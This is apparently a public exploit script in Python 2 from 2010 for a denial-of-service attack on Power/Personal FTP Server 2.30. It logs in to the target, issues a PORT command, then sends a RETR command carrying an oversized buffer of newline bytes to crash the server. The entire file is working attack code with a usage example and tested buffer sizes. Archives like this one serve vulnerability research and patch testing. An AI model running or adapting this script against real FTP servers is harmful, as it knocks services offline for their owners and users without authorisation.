#!/usr/bin/python
 
#--------------------------------------------
# Power/Personal FTP Server RETR Command DoS
#--------------------------------------------
 
# Title: Power/Personat FTP Server RETR Command DoS
# Author: antrhacks
# Software Link: http://www.cooolsoft.com/download/PowerFTP.EXE
# Version: 2.30
# Platform:  Windows XP SP3 Home edition Fr
# Tested with buffersize: 82000, 83000, 84000, ... 92000
# Example: ./PowerFTP.py 192.168.0.10 test test 85000
  
import socket
import sys
  
# Description:
# RETR command overflow with PORT specified
  
def howto():
    print ("Usage: scriptname.py <IP> <username> <password> <buffersize>\n")
  
def exploit(host,user,password):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', 6666)) # Need that for the PORT Command !!!
    try:
        sock.connect((host, 21))
    except:
        print ("Unable to connect to host")
        sys.exit(1)
    r=sock.recv(1024)
    print r
    r=sock.getsockname()
    print r
    sock.send("USER " + user + "\r\n")
    r=sock.recv(1024)
    print r
    sock.send("PASS " + password + "\r\n")
    r=sock.recv(1024)
    print r
    sock.send("PORT 192,168,0,11,26,10" + "\r\n") # 26,10 => 0x1a,0x0a => 6666
    r=sock.recv(1024)
    print r
    sock.send("RETR " + buffer + " \r\n")
    r=sock.recv(1024)
    print r
    sock.send("QUIT" + " \r\n")
    r=sock.recv(1024)
    print r
    sock.close()
          
if len(sys.argv) <> 5:
    howto()
    sys.exit(1)
else:
    host=sys.argv[1]
    user=sys.argv[2]
    password=sys.argv[3]
    buffersize=int(sys.argv[4])
    buffer="\x0a\x0a" * buffersize
    exploit(host,user,password)
    sys.exit(0)
  
# END
 
 
# (2010-07-15) - Inj3ct0r.com -